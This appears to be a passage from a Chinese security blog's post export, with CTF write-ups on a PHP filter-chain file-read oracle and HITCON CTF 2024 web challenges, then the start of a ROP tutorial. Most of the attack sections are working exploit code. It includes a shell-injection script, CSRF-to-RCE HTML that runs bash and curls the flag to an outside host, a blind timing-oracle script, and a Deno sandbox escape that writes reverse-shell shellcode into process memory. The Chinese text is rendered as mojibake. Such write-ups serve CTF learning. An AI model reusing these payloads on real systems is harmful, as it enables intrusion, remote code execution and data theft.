·çš„æˆ‘ä»¬ç”¨rot13å¯ä»¥åˆ¤æ–­nã€oã€pã€qã€rï¼Œ\n\u0026lt;?php $string = \u0026#34;START\u0026#34;; $size_bomb = \u0026#34;\u0026#34;; for ($i = 1; $i \u0026lt;= 13; $i++) { $size_bomb .= \u0026#34;convert.iconv.UTF8.UCS-4|\u0026#34;; } $guess_char = \u0026#34;\u0026#34;; $index = 0; for ($i=1; $i \u0026lt;= 6; $i++) { $remove_junk_chars = \u0026#34;convert.quoted-printable-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-encode|\u0026#34;; $guess_char .= \u0026#34;convert.iconv.UTF8.UNICODE|convert.iconv.UNICODE.CP930|$remove_junk_chars|\u0026#34;; $rot13filter = \u0026#34;string.rot13|\u0026#34;; $filter = \u0026#34;php://filter/$rot13filter$guess_char|dechunk|$size_bomb/resource=/tmp/test\u0026#34;; file_get_contents($filter); echo \u0026#34;IBM-930 conversions : \u0026#34;.$i.\u0026#34;, the first character is \u0026#34;.\u0026#34;rqpon\u0026#34;[$i-1].\u0026#34;\\n\u0026#34;; } Retrieving [0-9] characters #\rè¿™é‡Œå°±ç”¨åˆ°base64ç¼–ç å’Œè§£ç çš„çŸ¥è¯†ï¼Œå¯ä»¥çœ‹çœ‹æˆ‘ä¹‹å‰å†™çš„filterchain å°±è¡Œäº†ã€‚ç„¶åè¿™é‡Œå°±å†™ä¸€ä¸ªè¡¨æ€»ç»“ä¸€ä¸‹ è¿™æ ·å­å°±å¾ˆå®¹æ˜“çŸ¥é“æ˜¯æ•°å­—å‡ äº†ã€‚\nRetrieving other letters #\rè¿™ä¸ªå…·ä½“ä¹Ÿæ˜¯åˆ©ç”¨å‰é¢è¯´çš„åˆ©ç”¨IBMå’ŒASCIIçš„ç‰¹æ€§åŒºåˆ«æ¥è¿›è¡Œç¡®å®šã€‚ ä¾‹å¦‚ï¼šZåœ¨ASCIIè¡¨ç¤ºä¸º0x5Aï¼Œè€Œåœ¨IBM-285ä¸­0x5Aå´è¡¨ç¤º! ç„¶åè½¬åŒ–ä¸ºIBM-280ä»–å°±ä¼šå˜æˆ0x4Fï¼Œç„¶å0x4Fåˆè¡¨ç¤ºoåœ¨ASCIIä¸­ï¼Œæˆ‘ä»¬å†ç”¨rot13æ¥è¿‡æ»¤ä¸€ä¸‹ä»–å°±ä¼šå˜æˆBï¼Œä¹Ÿå°±åˆšå¥½æ˜¯dechunkè·å–åˆ°çš„Bäº†ã€‚ å…·ä½“çš„å°±ä¸ç”¨å¤šè¯´äº†å§ã€‚\nInvalid multi-bytes sequence explanation #\r\u0026lt;?php $size_bomb = \u0026#34;\u0026#34;; for ($i = 1; $i \u0026lt;= 20; $i++) { $size_bomb .= \u0026#34;convert.iconv.UTF8.UCS-4|\u0026#34;; } $guess_char = \u0026#34;\u0026#34;; $index = 0; for ($i=1; $i \u0026lt;= 6; $i++) { $remove_junk_chars = \u0026#34;convert.quoted-printable-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-encode|\u0026#34;; $guess_char .= \u0026#34;convert.iconv.UTF8.UNICODE|convert.iconv.UNICODE.CP930|$remove_junk_chars\u0026#34;; $swap_bits = \u0026#34;convert.iconv.UTF16.UTF16|convert.iconv.UCS-4LE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UCS-4LE.UCS-4|\u0026#34;; $filter = \u0026#34;php://filter/$swap_bits$guess_char|dechunk|$size_bomb/resource=/tmp/test\u0026#34;; file_get_contents($filter); echo \u0026#34;IBM-930 conversions : \u0026#34;.$i.\u0026#34;, the fifth character is \u0026#34;.\u0026#34;edcba\u0026#34;[$i-1].\u0026#34;\\n\u0026#34;; } åˆ°è¿™é‡ŒåŸºæœ¬ä¸Šæ•´ä¸ªåˆ©ç”¨éƒ½è®²å®Œäº†ã€‚å…¶å®æœ¬è´¨ä¸Šå°±æ˜¯åˆ©ç”¨è¿‡æ»¤å™¨çš„ç‰¹æ€§æ¥ä¸æ–­ç¡®å®šæœ€ç»ˆå­—ç¬¦ã€‚\nå—å½±å“çš„å‡½æ•° #\rfile_get_contents readfile finfo-\u0026gt;file getimagesize md5_file hash_file sha1_file parse_ini_file parse_ini_file file copy file_put_contents (only target read only with this) stream_get_contents fgetsfread fgetc fgetcsv fpassthru fputs ç„¶åä¹Ÿæœ‰å·¥å…·å¯ä»¥ç›´æ¥åˆ©ç”¨ https://github.com/synacktiv/php_filter_chains_oracle_exploit\nreferenceï¼š https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle\n","date":"25 July 2024","externalUrl":null,"permalink":"/posts/filterleak/","section":"Posts","summary":"","title":"filterä¸­å‘ç”Ÿçš„leak","type":"posts"},{"content":"é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼š https://xz.aliyun.com/t/15130?time__1311=GqjxuQD%3DeewxlxGg2DyDmgtQm7SbmQ2YD\nEcho as a Service #\rè¿™é‡Œå…ˆæ”¾å‡ºæºç \nimport { $ } from \u0026#34;bun\u0026#34;;\rconst server = Bun.serve({\rhost: \u0026#34;0.0.0.0\u0026#34;,\rport: 1337,\rasync fetch(req) {\rconst url = new URL(req.url);\rif (url.pathname === \u0026#34;/\u0026#34;) {\rreturn new Response(`\r\u0026lt;p\u0026gt;Welcome to echo-as-a-service! Try it out:\u0026lt;/p\u0026gt;\r\u0026lt;form action=\u0026#34;/echo\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;msg\u0026#34; /\u0026gt;\r\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34; /\u0026gt;\r\u0026lt;/form\u0026gt;\r`.trim(), { headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;text/html\u0026#34; } });\r}\relse if (url.pathname === \u0026#34;/echo\u0026#34;) {\rconst msg = (await req.formData()).get(\u0026#34;msg\u0026#34;);\rif (typeof msg !== \u0026#34;string\u0026#34;) {\rreturn new Response(\u0026#34;Something\u0026#39;s wrong, I can feel it\u0026#34;, { status: 400 });\r}\rconst output = await $`echo ${msg}`.text();\rreturn new Response(output, { headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;text/plain\u0026#34; } });\r}\r}\r});\rconsole.log(`listening on http://localhost:${server.port}`); è¿™é‡Œå› ä¸ºé¢˜ç›®describeè¯´è¦RCEæ‰€ä»¥è¿™é‡Œç›´æ¥èƒ½å®šä½åˆ°\nconst output = await $`echo ${msg}`.text();\rreturn new Response(output, { headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;text/plain\u0026#34; } });\r}\r}\r}); è¿™é‡Œé€šè¿‡bunçš„docs å¯¹æ¯”ä¸€ä¸‹å½“å‰ç‰ˆæœ¬å’Œ1.1.8ç‰ˆæœ¬åœ¨ä½¿ç”¨shellçš„åŒºåˆ«\nå½“å‰ { \u0026#39;~\u0026#39;, \u0026#39;[\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;\\n\u0026#39;, \u0026#39;*\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39;,\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;$\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;(\u0026#39;, \u0026#39;)\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;\\\\\u0026#39; } 1.1.8 { \u0026#39;$\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;\\n\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;,\u0026#39;, \u0026#39;(\u0026#39;, \u0026#39;)\u0026#39;, \u0026#39;\\\\\u0026#39;, \u0026#39;\\\u0026#34;\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;\\\u0026#39;\u0026#39; } å¯ä»¥çœ‹è§å¯ä»¥è¿›è¡Œsubshellï¼Œå¹¶ä¸”å¯ä»¥åˆ©ç”¨\u0026lt;æ¥å†™å…¥æ–‡ä»¶ æ‰€ä»¥å°±è¿™æ ·\n/readflag give me the flag1\u0026lt;test æœ€ç»ˆè„šæœ¬\ncmd = [\u0026#39;/readflag\\tgive\\tme\\tthe\\tflag1\u0026lt;flag.sh\u0026#39;, \u0026#39;`sh\u0026lt;flag.sh`\u0026#39;] [print(__import__(\u0026#34;requests\u0026#34;).post(\u0026#34;http://192.168.174.128:32768/echo\u0026#34;, data={\u0026#39;msg\u0026#39;: cmd[x]}).text) for x in range(2)] å¯ä»¥çœ‹åˆ°è¯»åˆ°äº†ã€‚\nRClonE #\ré¢˜ç›®æè¿°\nRclone is a CLI that syncs your files to various cloud storage. But do you know it also have a built-in web UI? ç„¶åè¿™é‡Œæˆ‘ä»¬ä¸»è¦çœ‹ä¸€ä¸‹å¤§æ¦‚çš„é€»è¾‘ bot.js\nconst visit = async url =\u0026gt; {\rlet context = null\rtry {\rif (!browser) {\rconst args = [\u0026#39;--js-flags=--jitless,--no-expose-wasm\u0026#39;, \u0026#39;--disable-gpu\u0026#39;, \u0026#39;--disable-dev-shm-usage\u0026#39;]\rif (new URL(SITE).protocol === \u0026#39;http:\u0026#39;) {\rargs.push(`--unsafely-treat-insecure-origin-as-secure=${SITE}`)\r}\rbrowser = await puppeteer.launch({\rheadless: \u0026#39;new\u0026#39;,\rargs\r})\r}\rcontext = await browser.createBrowserContext()\rconst page1 = await context.newPage()\rawait page1.goto(LOGIN_URL)\rawait page1.close()\rconst page2 = await context.newPage()\rawait Promise.race([\rpage2.goto(url, {\rwaitUntil: \u0026#39;networkidle0\u0026#39;\r}),\rsleep(5000)\r])\rawait page2.close()\rawait context.close()\rcontext = null\r} catch (e) {\rconsole.log(e)\r} finally {\rif (context) await context.close()\r}\r} app.js\napp.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; {\rres.send(INDEX_HTML)\r})\rapp.post(\u0026#39;/submit\u0026#39;, async (req, res) =\u0026gt; {\rconst { url } = req.body\rif (!url || !URL_CHECK_REGEX.test(url)) {\rreturn res.status(400).send(\u0026#39;Invalid URL\u0026#39;)\r}\rtry {\rconsole.log(`[+] Sending ${url} to bot`)\rawait visit(url)\rres.send(\u0026#39;OK\u0026#39;)\r} catch (e) {\rconsole.log(e)\rres.status(500).send(\u0026#39;Something is wrong...\u0026#39;)\r}\r}) è¿™é‡Œæˆ‘ä»¬æ­å»ºèµ·æ¥ç¯å¢ƒ å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªä¼ urlçš„åœ°æ–¹ï¼Œè¿™é‡Œç›²çŒœä¸€ä¸‹æ˜¯ssrfï¼Œå› ä¸ºä¸€èˆ¬éƒ½å‡ºç°åœ¨è¿™ç§è¯·æ±‚å½“ä¸­ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥å‘ç°æºç å¹¶æ²¡æœ‰å¯¹å…¶åšè¿‡æ»¤ã€‚ è¿™é‡Œæˆ‘ä»¬ç”¨webhookæµ‹è¯•ä¸€ä¸‹ å¯ä»¥çœ‹åˆ°æ˜¯åšäº†ä¸€ä¸ªè¯·æ±‚çš„ã€‚ https://rclone.org/sftp/#sftp-ssh ç„¶åé€šè¿‡è¿™ä¸ªrcloneå®˜ç½‘å¯ä»¥çœ‹è§æˆ‘ä»¬å¯ä»¥åˆ©ç”¨sftpå»åœ¨sshæ‰§è¡Œå‘½ä»¤çš„ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ªè¿œç¨‹çš„SFTPåœ°å€ã€‚ ç„¶åå¦‚æœæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªremoteçš„SFTPæœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯·æ±‚è¿™ä¸ªè·¯ç”±æ¥è¿›è¡Œåˆ›å»ºhttp://xxxx:5527/config/creat\ncurl -X POST -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;my_sftp_remote\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;sftp\u0026#34;, \u0026#34;parameters\u0026#34;: {\u0026#34;host\u0026#34;: \u0026#34;sftp.example.com\u0026#34;, \u0026#34;user\u0026#34;: \u0026#34;username\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;password\u0026#34;}}\u0026#39; http://localhost:5572/config/create è¿™æ ·å­æˆ‘ä»¬å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªremoteï¼Œç„¶åæˆ‘ä»¬å†™æˆhtmlå¯ä»¥è¿™æ ·\n\u0026lt;form action=\u0026#34;http://192.168.174.128:5572/config/create\u0026#34; method=\u0026#34;POST\u0026#34; id=\u0026#34;cfgform\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;name\u0026#34; value=\u0026#34;yy\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;type\u0026#34; value=\u0026#34;sftp\u0026#34; /\u0026gt; \u0026lt;!-- https://github.com/rclone/rclone/blob/7b8bbe531e0f062254b2d8ffe1e6284cd62309f6/fs/config/rc.go#L150 will parse parameters using json.Unmarshal --\u0026gt; \u0026lt;input name=\u0026#34;parameters\u0026#34; /\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Create\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; cfgform.parameters.value = JSON.stringify({ // ssh: \u0026#39;bash -c \u0026#34;touch /tmp/pwned\u0026#34;\u0026#39; ssh: `bash -c \u0026#34;curl http://192.168.174.128:8080/submit -d url=http://${location.host}/flag?flag=$(/readflag)\u0026#34;` }) \u0026lt;/script\u0026gt; ç„¶ååé¢çš„jsæ˜¯ä¸ºäº†æŠŠsshè¦æ‰§è¡Œçš„å‘½ä»¤å…ˆå†™è¿›å»ç„¶ååœ¨åé¢è®¿é—®çš„æ—¶å€™è®©ä»–è‡ªåŠ¨è§¦å‘\n\u0026lt;form action=\u0026#34;http://192.168.174.128:5572/operations/list\u0026#34; method=\u0026#34;POST\u0026#34; id=\u0026#34;listform\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;fs\u0026#34; value=\u0026#34;yy:\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;remote\u0026#34; value=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Do List\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; cfgform.submit() setTimeout(() =\u0026gt; { listform.submit() }, 1500) \u0026lt;/script\u0026gt; \u0026lt;img src=\u0026#34;/delay.php?seconds=5\u0026#34; /\u0026gt; \u0026lt;!-- hitcon{easy_peasy_rce_using_csrf_attacking_local_server} --\u0026gt; è¿™æ ·å­å°±ä¼šè§¦å‘è®©ä»–æ‰§è¡Œä¸Šé¢å†™çš„sshå‘½ä»¤ç„¶åæŠŠå†…å®¹å¤–å¸¦å‡ºæ¥ã€‚\nç„¶åå¦å¤–ä¸€ä¸ªé˜Ÿä¼çš„wpæ˜¯è¿™ä¹ˆå†™çš„ï¼Œå› ä¸ºrcloneä¸å‡ºç½‘æ‰€ä»¥åˆ©ç”¨äºŒåˆ†æ³•è¿›å»æŠŠflag leakå‡ºæ¥\nimport requests import base64 import time url = \u0026#34;http://rclone.chal.hitconctf.com:30068/submit\u0026#34; # run it first # php -S 0.0.0.0:3000 exp.html exp1 = \u0026#34;\u0026#34;\u0026#34; \u0026lt;form id=\u0026#34;rce\u0026#34; method=\u0026#34;post\u0026#34; action=\u0026#34;http://rclone:5572/config/create\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;name\u0026#34; value=\u0026#34;u\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;type\u0026#34; value=\u0026#34;webdav\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;parameters\u0026#34; value=\u0026#39;{{\u0026#34;bearer_token_command\u0026#34;:\u0026#34;{}\u0026#34;, \u0026#34;url\u0026#34;:\u0026#34;http://bot:8000\u0026#34;}}\u0026#39;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; rce.submit(); \u0026lt;/script\u0026gt; \u0026#34;\u0026#34;\u0026#34; exp2 = \u0026#34;\u0026#34;\u0026#34; \u0026lt;form id=\u0026#34;form\u0026#34; method=\u0026#34;post\u0026#34; action=\u0026#34;http://rclone:5572/operations/list\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;fs\u0026#34; value=\u0026#34;u:\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;remote\u0026#34; value=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; form.submit(); \u0026lt;/script\u0026gt; \u0026#34;\u0026#34;\u0026#34; flag = \u0026#34;aGl0Y29ue2Vhc3lfcGVhc3lfcmNlX3VzaW5nX2NzcmZfYXR0YWNraW5nX2xvY2FsX3\u0026#34; wordlist = \u0026#34;+/0123456789=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\u0026#34; def foo(c, opt): with open(\u0026#34;exp.html\u0026#34;, \u0026#34;w\u0026#34;) as f: payload = f\u0026#34;[[ $(/readflag|base64) {opt} {flag}{c}* ]] \u0026amp;\u0026amp; sleep 5\u0026#34; payload = base64.b64encode(payload.encode()).decode() payload = f\u0026#34;bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}\u0026#34; f.write(exp1.format(payload)) r = requests.post(url, data={\u0026#34;url\u0026#34;: \u0026#34;https://dev.vincent55.tw\u0026#34;}) with open(\u0026#34;exp.html\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(exp2) start = time.time() requests.post(url, data={\u0026#34;url\u0026#34;: \u0026#34;https://dev.vincent55.tw\u0026#34;}) end = time.time() if end - start \u0026gt; 4: return True return False while True: lb = -1 rb = 65 while lb + 1 \u0026lt; rb: m = (lb + rb) // 2 if foo(wordlist[m], \u0026#34;\u0026gt;\u0026#34;): lb = m else: rb = m flag += wordlist[lb] print(flag) Truth of NPM #\ré¦–å…ˆæˆ‘ä»¬çœ‹åˆ°query.tsxæ–‡ä»¶ä¸­æœ‰è¿™ä¹ˆä¸€ä¸ªå‡½æ•°\nasync function queryPackage(packageName: string) {\rif (cache.has(packageName)) {\rreturn cache.get(packageName) as CachedPackageQueryResult\r}\rconst pkgjson: PackageJson | null = await (async () =\u0026gt; {\rtry {\rconst module = await import(`npm:${packageName}/package.json`, {\rwith: {\rtype: \u0026#39;json\u0026#39;\r}\r})\rreturn module.default\r} catch {\rreturn null\r}\r})()\rif (!pkgjson) {\rconst ps = await asyncMapToArray(walkPackageFiles(npmDir), entry =\u0026gt; Deno.remove(entry.path))\rawait Promise.all(ps)\rreturn null\r}\rlet totalSize = 0\rconst ps = await asyncMapToArray(walkPackageFiles(npmDir), async entry =\u0026gt; {\rconst { size } = await Deno.stat(entry.path)\rtotalSize += size\rreturn Deno.remove(entry.path)\r})\rawait Promise.all(ps)\rconst ret = { size: totalSize, pkgjson }\rcache.set(packageName, ret)\rreturn ret\r} è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°\nconst module = await import(`npm:${packageName}/package.json`, {\rwith: {\rtype: \u0026#39;json\u0026#39;\r}\r}) è¿™é‡Œä»–ä¼šè‡ªåŠ¨importä¸€ä¸ªåŒ…ï¼Œè¿™ä¸ªåŒ…å¯ä»¥æ˜¯remoteçš„ã€‚ ç„¶ååœ¨importå®Œä¹‹å\nif (!pkgjson) {\rconst ps = await asyncMapToArray(walkPackageFiles(npmDir), entry =\u0026gt; Deno.remove(entry.path))\rawait Promise.all(ps)\rreturn null\r} ä»–å°±ä¼šåˆ æ‰åŸæ¥çš„ä½ installåŒ…ä¸­çš„æ–‡ä»¶ï¼Œä½†æ˜¯å› ä¸ºè¿™ä¸ªåˆ é™¤ç”¨çš„æ˜¯è¿™ä¸ªå‡½æ•°fs.walk\nasync function* walkPackageFiles(npmDir: string) {\rfor await (const entry of fs.walk(npmDir)) {\rif (entry.isDirectory) continue\r// registry.json is generated by deno\rif (entry.name !== \u0026#39;registry.json\u0026#39;) {\ryield entry\r}\r}\r} ä»–çš„ç‰¹æ€§å°±æ˜¯ä¼šä¿ç•™éutf-8ç¼–ç çš„æ–‡ä»¶å³tsxæ–‡ä»¶ã€‚ ç„¶ååœ¨mainå‡½æ•°ä¸­\nimport { Hono, Context } from \u0026#39;hono\u0026#39;\rimport { rateLimiter } from \u0026#39;./utils.ts\u0026#39;\rconst app = new Hono()\rapp.use(rateLimiter(1))\rapp.use(async (c: Context) =\u0026gt; {\rconst page = c.req.path.slice(1) || \u0026#39;index\u0026#39;\rtry {\rconst { handler } = await import(`./pages/${page}.tsx`)\rreturn handler(c)\r} catch {\rreturn c.html(\u0026#39;404 Not Found\u0026#39;, 404)\r}\r})\rexport default app ä½ è®¿é—®ä½ åŒ…çš„åç§°å°±ä¼šè‡ªåŠ¨importä¸‹æ¥ï¼Œå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ï¼Œä½†æ˜¯æˆ‘ä»¬éƒ½æ˜¯åœ¨Denoçš„æ²™ç®±ä¸­çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰§è¡Œå‘½ä»¤çš„è¯è¦ç»•ä¸€ä¸‹æ²™ç®± è¿™é‡Œå…·ä½“è¿˜æ²¡ç ”ç©¶é€æ€ä¹ˆç»•çš„å‘œå‘œå‘œè¿˜å¾—èŠ±ç‚¹æ—¶é—´ exp.tsx\nexport const handler = async c-\u0026gt;{\rconst body = await c.req.text()\rreturn c.text(eval(body))\r} exp.jsï¼ˆç»•æ²™ç®±ï¼‰\ntry {\rDeno.removeSync(\u0026#39;/tmp/self\u0026#39;)\r} catch {}\rDeno.symlinkSync(\u0026#39;/proc/self\u0026#39;, \u0026#39;/tmp/self\u0026#39;) // bypass https://github.com/denoland/deno/security/advisories/GHSA-23rx-c3g5-hv9w\rconst maps = Deno.readTextFileSync(\u0026#39;/tmp/self/maps\u0026#39;)\rconst first = maps.split(\u0026#39;\\n\u0026#39;).find(x =\u0026gt; x.includes(\u0026#39;deno\u0026#39;))\rconst offset = 0x401c2c0 // p \u0026amp;Builtins_JsonStringify-0x555555554000\rconst base = parseInt(first.split(\u0026#39;-\u0026#39;)[0], 16)\rconst addr = base + offset\rconsole.log(\u0026#39;\u0026amp;Builtins_JsonStringify\u0026#39;, addr.toString(16))\rconst mem = Deno.openSync(\u0026#39;/tmp/self/mem\u0026#39;, {\rwrite: true\r})\r/*\rfrom pwn import *\rcontext.arch = \u0026#39;amd64\u0026#39;\rsc = asm(shellcraft.connect(\u0026#39;127.0.0.1\u0026#39;, 3535, \u0026#39;ipv4\u0026#39;) + shellcraft.dupsh()) print(list(sc))\r*/\rconst shellcode = new Uint8Array([\r106, 41, 88, 106, 2, 95, 106, 1, 94, 153, 15, 5, 72, 137, 197, 72, 184, 1, 1, 1, 1, 1, 1, 1, 2, 80, 72, 184, 3, 1,\r12, 206, 126, 1, 1, 3, 72, 49, 4, 36, 106, 42, 88, 72, 137, 239, 106, 16, 90, 72, 137, 230, 15, 5, 72, 137, 239,\r106, 2, 94, 106, 33, 88, 15, 5, 72, 255, 206, 121, 246, 106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80,\r72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230,\r49, 210, 106, 59, 88, 15, 5\r])\rmem.seekSync(addr, Deno.SeekMode.Start)\rmem.writeSync(shellcode)\rJSON.stringify(\u0026#39;pwned\u0026#39;)\r/*\r1. create a npm package with filename includes invalid utf-8 and publish (tar czf package.tar.gz exppkg \u0026amp;\u0026amp; npm publish package.tar.gz --access public)\r2. curl \u0026#39;http://localhost:8000/query?package=@maple3142/exploit_of_truth_of_npm\u0026#39;\r3. curl --path-as-is \u0026#39;http://localhost:8000/../../deno-dir/npm/registry.npmjs.org/@maple3142/exploit_of_truth_of_npm/0.0.1/exp%ff\u0026#39; -T exp.js\r*/\r// hitcon{the_fix_that_does_not_really_address_the_issue} ","date":"22 July 2024","externalUrl":null,"permalink":"/posts/hitcon2024/","section":"Posts","summary":"","title":"HITCON CTF 2024 webå¤ç°","type":"posts"},{"content":"","date":"22 July 2024","externalUrl":null,"permalink":"/tags/wp/","section":"Tags","summary":"","title":"WP","type":"tags"},{"content":"","date":"12 July 2024","externalUrl":null,"permalink":"/categories/pwn/","section":"Categories","summary":"","title":"PWN","type":"categories"},{"content":"","date":"12 July 2024","externalUrl":null,"permalink":"/tags/rop/","section":"Tags","summary":"","title":"ROP","type":"tags"},{"content":"å‰è¨€ #\ræœ¬æ¥åœ¨æ ¡çš„æ—¶å€™å°±æŠŠç‹çˆ½çš„æ±‡ç¼–çœ‹å®Œäº†ï¼Œç„¶åä¹Ÿçœ‹äº†ä¸€ç‚¹äºŒè¿›åˆ¶çš„çŸ¥è¯†ï¼Œæƒ³ç€å¼€å§‹å­¦pwnçš„ï¼Œç»“æœåˆæ˜¯æ‹–äº†å¥½ä¹…ï¼Œè¿™ä¸æš‘å‡æ‰å¼€å§‹ï¼Œåœ¨è¿™é‡Œç‰¹åˆ«æ„Ÿè°¢ä¸€ä¸‹D1noçš„Duskå¸ˆå‚…å‘œå‘œå‘œã€‚\nå‰ç½®çŸ¥è¯† #\råœ¨å­¦ä¹ è¿™ä¸ªçŸ¥è¯†ç‚¹ä¹‹å‰è¦äº†è§£ä¸€äº›ä¸œè¥¿ï¼š\n16è¿›åˆ¶çš„è¿ç®—ï¼ˆè™½ç„¶è¯´è¿™ä¸ªæ¯”è¾ƒç®€å•ä½†ä¹Ÿæ˜¯å¤´ç–¼ï¼‰ GDBçš„ç®€å•ä½¿ç”¨ RETæ‰€åœ¨ä½ç½®ï¼ˆx64æ˜¯åœ¨rbpä¸Šå…«ä¸ªå­—èŠ‚ï¼Œx86æ˜¯åœ¨ebpä¸Šé¢å››ä¸ªå­—èŠ‚ï¼‰ åªéœ€è¦çŸ¥é“è¿™å‡ ä¸ªä»¥åŠä¸€äº›æ±‡ç¼–åŸºç¡€å°±å¯ä»¥å¼€å§‹å•¦\nï¼ˆè¿™é‡Œæ‰€æœ‰çš„æº¢å‡ºéƒ½ä¸å¼€å¯ä¿æŠ¤ï¼‰\nRet2text #\råŸç†ï¼š ret2text å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (å³ï¼Œ .text æ®µä¸­çš„ä»£ç ) ã€‚å…¶å®ï¼Œè¿™ç§æ”»å‡»æ–¹æ³•æ˜¯ä¸€ç§ç¬¼ç»Ÿçš„æè¿°ã€‚æˆ‘ä»¬æ§åˆ¶æ‰§è¡Œç¨‹åºå·²æœ‰çš„ä»£ç çš„æ—¶å€™ä¹Ÿå¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œå¥½å‡ æ®µä¸ç›¸é‚»çš„ç¨‹åºå·²æœ‰çš„ä»£ç  (ä¹Ÿå°±æ˜¯ gadgets)ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ‰€è¦è¯´çš„ ROPã€‚\nè¿™é‡Œæ˜¯æ‹¿wikiçš„é¢˜ç›®æ¥åšçš„\nâœ ret2text checksec ret2text\rArch: i386-32-little\rRELRO: Partial RELRO\rStack: No canary found\rNX: NX enabled\rPIE: No PIE (0x8048000) å¯ä»¥çœ‹åˆ°æœ‰NXä½†æ˜¯å¯¹æ ˆæº¢å‡ºæ²¡ä»€ä¹ˆé™åˆ¶ç„¶åæˆ‘ä»¬åç¼–è¯‘ä¸€ä¸‹\nint __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(\u0026#34;There is something amazing here, do you know anything?\u0026#34;); gets((char *)\u0026amp;v4); printf(\u0026#34;Maybe I will tell you next time !\u0026#34;); return 0; } è¿™é‡Œå¯ä»¥çœ‹åˆ°V4çš„åœ°å€åœ¨rbp-0x64çš„ä½ç½®ï¼Œå¹¶ä¸”åˆ©ç”¨äº†getsè¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°å­˜åœ¨ä¸€ä¸ªåé¢çš„åœ°æ–¹å°±å¯ä»¥è¿›è¡Œæ”»å‡»äº†\n.text:080485FD secure proc near .text:080485FD .text:080485FD input = dword ptr -10h .text:080485FD secretcode = dword ptr -0Ch .text:080485FD .text:080485FD push ebp .text:080485FE mov ebp, esp .text:08048600 sub esp, 28h .text:08048603 mov dword ptr [esp], 